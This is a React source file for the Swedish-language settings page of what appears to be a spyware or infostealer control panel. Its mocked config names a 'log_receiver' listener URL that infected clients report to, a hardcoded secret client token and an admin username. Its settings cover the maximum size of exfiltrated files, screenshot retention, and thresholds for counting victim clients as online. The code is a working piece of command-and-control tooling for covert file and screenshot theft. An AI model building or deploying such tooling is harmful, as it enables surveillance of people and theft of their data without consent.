
import React, { useState } from "react";
import { useQuery } from "@tanstack/react-query";
import { Card, CardContent, CardDescription, CardHeader, CardTitle, CardFooter } from "@/components/ui/card";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Switch } from "@/components/ui/switch";
import { Skeleton } from "@/components/ui/skeleton";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Eye, EyeOff } from "lucide-react";

const fetchSettings = async () => {
  // In a real implementation, fetch from server
  // return await fetch('/api/settings').then(res => res.json());
  
  // Mocked data for development
  return {
    server: {
      url: "https://neea.fun/listener/log_receiver",
      token: "SmpVdUpXMEZKTk5nT2CQWGh4SVFlM3lNUWtDUGZJeEtXM2VkU3RuUExwVg==",
      version: "1.2.0",
      status: "online",
      pingInterval: 3600,
      sizeLimit: 1048576,
      activeThreshold: 10,
      onlineThreshold: 15
    },
    admin: {
      username: "wickey",
      lastLogin: "2023-03-21 14:00:00"
    },
    logging: {
      logExpiry: 30,
      screenshotExpiry: 14,
      detailedLogging: true,
      autoCleanup: true
    },
    ui: {
      darkMode: false,
      refreshInterval: 30,
      language: "sv"
    }
  };
};

export default function Settings() {
  const [activeTab, setActiveTab] = useState("server");
  const [showToken, setShowToken] = useState(false);
  const [formData, setFormData] = useState({
    username: "",
    currentPassword: "",
    newPassword: "",
    confirmPassword: ""
  });
  
  const { data, isLoading, error } = useQuery({
    queryKey: ['settings'],
    queryFn: fetchSettings
  });

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    setFormData({
      ...formData,
      [name]: value
    });
  };

  const handlePasswordSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    console.log("Password update submitted:", formData);
    // In a real implementation, send to server: POST /api/update_credentials
    setFormData({
      username: "",
      currentPassword: "",
      newPassword: "",
      confirmPassword: ""
    });
  };

  const handleSwitchChange = (checked: boolean, setting: string) => {
    console.log(`Setting ${setting} changed to ${checked}`);
    // In a real implementation, update the setting on the server
  };

  const handleSelectChange = (value: string, setting: string) => {
    console.log(`Setting ${setting} changed to ${value}`);
    // In a real implementation, update the setting on the server
  };

  if (error) {
    return <div className="p-6">Error loading settings: {error.message}</div>;
  }

  const maskToken = (token?: string) => {
    if (!token) return "••••••••••••••••";
    return showToken ? token : token.substring(0, 4) + "••••••••••••" + token.substring(token.length - 4);
  };

  return (
    <div className="h-full flex-1 flex-col space-y-8 p-8 md:flex">
      <div className="flex items-center justify-between">
        <h2 className="text-3xl font-bold tracking-tight">Inställningar</h2>
      </div>

      <Tabs value={activeTab} onValueChange={setActiveTab}>
        <TabsList className="grid w-full md:w-[600px] grid-cols-4">
          <TabsTrigger value="server">Server</TabsTrigger>
          <TabsTrigger value="admin">Admin</TabsTrigger>
          <TabsTrigger value="logging">Loggning</TabsTrigger>
          <TabsTrigger value="ui">Gränssnitt</TabsTrigger>
        </TabsList>
        
        {/* Server Settings */}
        <TabsContent value="server" className="space-y-6">
          <Card>
            <CardHeader>
              <CardTitle>Serverinställningar</CardTitle>
              <CardDescription>
                Hantera den underliggande serverns konfiguration
              </CardDescription>
            </CardHeader>
            <CardContent className="space-y-6">
              <div className="grid gap-3">
                <Label>Server URL</Label>
                {isLoading ? (
                  <Skeleton className="h-10 w-full" />
                ) : (
                  <Input value={data?.server.url} readOnly />
                )}
                <p className="text-sm text-muted-foreground">
                  URL:en som klienter rapporterar till. Detta är inställt i klientkonfigurationen.
                </p>
              </div>
              
              <div className="grid gap-3">
                <Label>Hemlig Token</Label>
                {isLoading ? (
                  <Skeleton className="h-10 w-full" />
                ) : (
                  <div className="flex gap-2">
                    <Input 
                      value={maskToken(data?.server.token)} 
                      readOnly 
                      className="flex-1" 
                    />
                    <Button 
                      variant="outline" 
                      size="icon" 
                      onClick={() => setShowToken(!showToken)}
                    >
                      {showToken ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
                    </Button>
                  </div>
                )}
                <p className="text-sm text-muted-foreground">
                  Hemlig token som används för att autentisera klientförfrågningar. 
                  Varning: Att ändra detta kräver uppdatering av alla klienter.
                </p>
              </div>
              
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div className="grid gap-3">
                  <Label>Uppdateringsintervall (s)</Label>
                  {isLoading ? (
                    <Skeleton className="h-10 w-full" />
                  ) : (
                    <Input 
                      type="number" 
                      value={data?.server.pingInterval} 
                      min="60" 
                      max="86400" 
                    />
                  )}
                  <p className="text-sm text-muted-foreground">
                    Hur ofta klienter skickar uppdateringar (sekunder)
                  </p>
                </div>
                
                <div className="grid gap-3">
                  <Label>Maximal filstorlek (bytes)</Label>
                  {isLoading ? (
                    <Skeleton className="h-10 w-full" />
                  ) : (
                    <Input 
                      type="number" 
                      value={data?.server.sizeLimit} 
                      min="10240" 
                    />
                  )}
                  <p className="text-sm text-muted-foreground">
                    Maximal storlek för filer som exfiltreras
                  </p>
                </div>
              </div>
              
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div className="grid gap-3">
                  <Label>Aktiv status tröskel (min)</Label>
                  {isLoading ? (
                    <Skeleton className="h-10 w-full" />
                  ) : (
                    <Input 
                      type="number" 
                      value={data?.server.activeThreshold} 
                      min="1" 
                      max="1440" 
                    />
                  )}
                  <p className="text-sm text-muted-foreground">
                    Minuter för att avgöra om en klient är aktiv
                  </p>
                </div>
                
                <div className="grid gap-3">
                  <Label>Online status tröskel (min)</Label>
                  {isLoading ? (
                    <Skeleton className="h-10 w-full" />
                  ) : (
                    <Input 
                      type="number" 
                      value={data?.server.onlineThreshold} 
                      min="1" 
                      max="1440" 
                    />
                  )}
                  <p className="text-sm text-muted-foreground">
                    Minuter för att avgöra om en klient är online
                  </p>
                </div>
              </div>
              
              <div className="grid gap-3">
                <Label>Server Status</Label>
                {isLoading ? (
                  <Skeleton className="h-10 w-full" />
                ) : (
                  <div className="flex items-center gap-2">
                    <div className={`w-3 h-3 rounded-full ${data?.server.status === 'online' ? 'bg-green-500' : 'bg-red-500'}`}></div>
                    <span className="capitalize">{data?.server.status}</span>
                    <span className="text-sm text-muted-foreground ml-auto">
                      Version: {data?.server.version}
                    </span>
                  </div>
                )}
              </div>
            </CardContent>
            <CardFooter className="flex justify-end">
              <Button>Spara ändringar</Button>
            </CardFooter>
          </Card>
        </TabsContent>
        
        {/* Admin Settings */}
        <TabsContent value="admin" className="space-y-6">
          <Card>
            <CardHeader>
              <CardTitle>Administratörsinställningar</CardTitle>
              <CardDescription>
                Hantera ditt administratörskonto
              </CardDescription>
            </CardHeader>
            <CardContent className="space-y-6">
              <div className="grid gap-3">
                <Label>Nuvarande användarnamn</Label>
                {isLoading ? (
                  <Skeleton className="h-10 w-full" />
                ) : (
                  <Input value={data?.admin.username} readOnly />
                )}
                <p className="text-sm text-muted-foreground">
                  Ditt nuvarande inloggningsnamn
                </p>
              </div>
              
              <div className="grid gap-3">
                <Label>Senaste inloggning</Label>
                {isLoading ? (
                  <Skeleton className="h-10 w-full" />
                ) : (
                  <Input value={data?.admin.lastLogin} readOnly />
                )}
              </div>
              
              <form onSubmit={handlePasswordSubmit} className="space-y-4">
                <h3 className="text-lg font-semibold">Byt lösenord</h3>
                
                <div className="grid gap-3">
                  <Label htmlFor="currentPassword">Nuvarande lösenord</Label>
                  <Input 
                    id="currentPassword"
                    name="currentPassword"
                    type="password"
                    value={formData.currentPassword}
                    onChange={handleInputChange}
                    required
                  />
                </div>
                
                <div className="grid gap-3">
                  <Label htmlFor="newPassword">Nytt lösenord</Label>
                  <Input 
                    id="newPassword"
                    name="newPassword"
                    type="password"
                    value={formData.newPassword}
                    onChange={handleInputChange}
                    required
                  />
                </div>
                
                <div className="grid gap-3">
                  <Label htmlFor="confirmPassword">Bekräfta nytt lösenord</Label>
                  <Input 
                    id="confirmPassword"
                    name="confirmPassword"
                    type="password"
                    value={formData.confirmPassword}
                    onChange={handleInputChange}
                    required
                  />
                </div>
                
                <div className="grid gap-3">
                  <Label htmlFor="username">Nytt användarnamn (valfritt)</Label>
                  <Input 
                    id="username"
                    name="username"
                    value={formData.username}
                    onChange={handleInputChange}
                  />
                </div>
                
                <Button type="submit">Uppdatera inloggningsuppgifter</Button>
              </form>
            </CardContent>
          </Card>
        </TabsContent>
        
        {/* Logging Settings */}
        <TabsContent value="logging" className="space-y-6">
          <Card>
            <CardHeader>
              <CardTitle>Logginställningar</CardTitle>
              <CardDescription>
                Hantera hur loggar lagras och rensas
              </CardDescription>
            </CardHeader>
            <CardContent className="space-y-6">
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div className="grid gap-3">
                  <Label>Loggförfallotid (dagar)</Label>
                  {isLoading ? (
                    <Skeleton className="h-10 w-full" />
                  ) : (
                    <Input 
                      type="number" 
                      value={data?.logging.logExpiry} 
                      min="1" 
                      max="365" 
                    />
                  )}
                  <p className="text-sm text-muted-foreground">
                    Antal dagar att behålla loggar innan rensning
                  </p>
                </div>
                
                <div className="grid gap-3">
                  <Label>Skärmdumpförfallotid (dagar)</Label>
                  {isLoading ? (
                    <Skeleton className="h-10 w-full" />
                  ) : (
                    <Input 
                      type="number" 
                      value={data?.logging.screenshotExpiry} 
                      min="1" 
                      max="365" 
                    />
                  )}
                  <p className="text-sm text-muted-foreground">
                    Antal dagar att behålla skärmdumpar innan rensning
                  </p>
                </div>
              </div>
              
              <div className="flex items-center space-x-2">
                {isLoading ? (
                  <Skeleton className="h-6 w-10" />
                ) : (
                  <Switch 
                    checked={data?.logging.detailedLogging} 
                    onCheckedChange={(checked) => handleSwitchChange(checked, "detailedLogging")}
                  />
                )}
                <Label>Detaljerad loggning</Label>
                <p className="text-sm text-muted-foreground ml-auto">
                  Aktivera mer detaljerad loggning (ökar lagringsutrymme)
                </p>
              </div>
              
              <div className="flex items-center space-x-2">
                {isLoading ? (
                  <Skeleton className="h-6 w-10" />
                ) : (
                  <Switch 
                    checked={data?.logging.autoCleanup} 
                    onCheckedChange={(checked) => handleSwitchChange(checked, "autoCleanup")}
                  />
                )}
                <Label>Automatisk rensning</Label>
                <p className="text-sm text-muted-foreground ml-auto">
                  Rensa gamla loggar och skärmdumpar automatiskt
                </p>
              </div>
              
              <div className="pt-4">
                <Button variant="destructive">Rensa alla loggar</Button>
                <p className="text-sm text-muted-foreground mt-2">
                  Varning: Detta kommer permanent att ta bort alla lagrade loggar. Denna åtgärd kan inte ångras.
                </p>
              </div>
            </CardContent>
            <CardFooter className="flex justify-end">
              <Button>Spara ändringar</Button>
            </CardFooter>
          </Card>
        </TabsContent>
        
        {/* UI Settings */}
        <TabsContent value="ui" className="space-y-6">
          <Card>
            <CardHeader>
              <CardTitle>Gränssnittsinställningar</CardTitle>
              <CardDescription>
                Anpassa hur administratörsgränssnittet visas
              </CardDescription>
            </CardHeader>
            <CardContent className="space-y-6">
              <div className="flex items-center space-x-2">
                {isLoading ? (
                  <Skeleton className="h-6 w-10" />
                ) : (
                  <Switch 
                    checked={data?.ui.darkMode} 
                    onCheckedChange={(checked) => handleSwitchChange(checked, "darkMode")}
                  />
                )}
                <Label>Mörkt läge</Label>
                <p className="text-sm text-muted-foreground ml-auto">
                  Använd mörkläge genom hela gränssnittet
                </p>
              </div>
              
              <div className="grid gap-3">
                <Label>Uppdateringsintervall (sekunder)</Label>
                {isLoading ? (
                  <Skeleton className="h-10 w-full" />
                ) : (
                  <Input 
                    type="number" 
                    value={data?.ui.refreshInterval} 
                    min="5" 
                    max="300" 
                  />
                )}
                <p className="text-sm text-muted-foreground">
                  Hur ofta gränssnittet uppdaterar data (sekunder)
                </p>
              </div>
              
              <div className="grid gap-3">
                <Label>Språk</Label>
                {isLoading ? (
                  <Skeleton className="h-10 w-full" />
                ) : (
                  <Select 
                    value={data?.ui.language}
                    onValueChange={(value) => handleSelectChange(value, "language")}
                  >
                    <SelectTrigger>
                      <SelectValue placeholder="Välj språk" />
                    </SelectTrigger>
                    <SelectContent>
                      <SelectItem value="sv">Svenska</SelectItem>
                      <SelectItem value="en">English</SelectItem>
                    </SelectContent>
                  </Select>
                )}
                <p className="text-sm text-muted-foreground">
                  Ändra gränssnittsspråk
                </p>
              </div>
            </CardContent>
            <CardFooter className="flex justify-end">
              <Button>Spara ändringar</Button>
            </CardFooter>
          </Card>
        </TabsContent>
      </Tabs>
    </div>
  );
}
